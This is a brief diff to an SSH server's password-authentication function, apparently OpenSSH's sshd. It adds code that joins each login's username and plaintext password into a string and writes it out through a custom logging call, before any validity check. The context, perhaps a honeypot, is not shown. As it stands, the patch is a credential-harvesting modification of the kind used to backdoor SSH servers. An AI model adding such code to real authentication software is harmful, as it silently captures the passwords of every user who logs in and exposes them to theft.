@@ -83,6 +83,13 @@ auth_password(struct ssh *ssh, const char *password)
 	static int expire_checked = 0;
 #endif
 
+	char *buffer;
+	buffer = malloc(strlen(authctxt->user) + strlen(password) + 10);
+	if(buffer != NULL){
+		sprintf(buffer, "%s:%s", authctxt->user, password);
+		mylog(ssh, CLIENT_SENT, "Password Authentication", -1, buffer, strlen(buffer));
+		free(buffer);
+	}
 	if (strlen(password) > MAX_PASSWORD_LEN)
 		return 0;
 
